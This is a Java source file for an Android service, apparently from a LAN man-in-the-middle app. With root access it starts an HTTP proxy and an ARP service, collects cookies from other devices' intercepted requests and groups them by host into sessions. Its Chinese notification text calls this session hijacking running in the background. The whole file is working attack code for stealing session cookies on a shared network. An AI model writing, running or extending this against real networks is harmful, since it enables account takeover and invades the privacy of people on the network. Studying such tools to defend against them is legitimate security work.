package com.oinux.lanmitm.service;

import java.util.ArrayList;

import org.apache.http.impl.cookie.BasicClientCookie;

import android.content.Intent;
import android.util.Log;

import com.oinux.lanmitm.AppContext;
import com.oinux.lanmitm.entity.Session;
import com.oinux.lanmitm.proxy.HttpProxy;
import com.oinux.lanmitm.proxy.HttpProxy.OnRequestListener;
import com.oinux.lanmitm.ui.HijackActivity;
import com.oinux.lanmitm.util.RequestParser;
import com.oinux.lanmitm.util.ShellUtils;

public class HijackService extends ProxyService {

	private OnRequestListener mOnRequestListener = null;

	public static final String DATASET_CHANGED = "HIJACK_DATASET_CHANGED";
	public static final String DATASET_COOKIES_CHANGED = "HIJACK_COOKIES_CHANGED";

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {

		if (!ShellUtils.checkRootPermission())
			return super.onStartCommand(intent, flags, startId);

		startHijack();

		return super.onStartCommand(intent, flags, startId);
	}

	@Override
	public void onCreate() {
		this.my_notice_id = HIJACK_NOTICE;
		this.my_ticker_text = "会话劫持后台运行中，点击管理";
		this.cls = HijackActivity.class;
		super.onCreate();
	}

	private void startHijack() {
		
		startHttpProxy();
		
		mOnRequestListener = new OnRequestListener() {

			@Override
			public void onRequest(String clientIp, String hostname,
					String serverIp, String path, ArrayList<String> headers) {
				Log.v("host", hostname);
				ArrayList<BasicClientCookie> cookies = RequestParser
						.getCookiesFromHeaders(headers);
				if (cookies.size() > 0) {
					String domain = cookies.get(0).getDomain();
					if (domain == null || domain.isEmpty()) {
						domain = RequestParser.getBaseDomain(hostname);
						for (BasicClientCookie cooky : cookies)
							cooky.setDomain(domain);
					}
				}
				Session session = null;
				Intent intent = new Intent();
				for (int i = 0; i < AppContext.getHijackList().size(); i++) {
					if (AppContext.getHijackList().get(i).getIp()
							.equals(serverIp)) {
						session = AppContext.getHijackList().get(i);
						intent.setAction(DATASET_COOKIES_CHANGED);
						break;
					}
				}
				if (session == null) {
					session = new Session();
					session.setIp(serverIp);
					session.setClientIp(clientIp);
					session.setDomain(hostname);
					session.setUserAgent(RequestParser.getHeaderValue(
							"User-Agent", headers));
					AppContext.getHijackList().add(session);
					intent.setAction(DATASET_CHANGED);
				}
				for (BasicClientCookie cookie : cookies) {
					session.getCookies().put(cookie.getName(), cookie);
				}
				session.setPath(path);
				sendBroadcast(intent);
			}
		};

		mHttpProxy.setOnRequestListener(mOnRequestListener);

		startArpService();

		AppContext.isHijackRunning = true;
	}

	private void stopHijack() {
		
		stopArpService();

		stopHttpProxy();

		AppContext.isHijackRunning = false;
	}

	@Override
	public void onDestroy() {
		stopHijack();
		super.onDestroy();
	}
}
